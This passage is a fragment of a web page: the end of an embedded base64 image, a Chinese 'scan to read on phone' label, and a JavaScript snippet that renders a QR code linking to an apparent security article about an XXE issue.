IbK/Q3MN5K7wlFXej737B3BeCy0VV378+kPwAK398Amsgj8/orY5pIL5G9/Do6VwDcT2BI/v2dgHs8KjA/TNCrzefe0DXYZ/bB3sesLQhsD2j+ws34fYXhAYdpSugczfr9AWhy+uYBjJVLeKtJ9AGAjEtOIdHT+lpZ4Te96g2a66HqM1alUP4XPcI3aPyWXuErq181jJWvsy1gWRy5dedwBrIdWdf7vw/AAAA//8wrLgbAAAABklEQVQDAAowkW4/5JmeAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-AIInt-AITaskBack-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 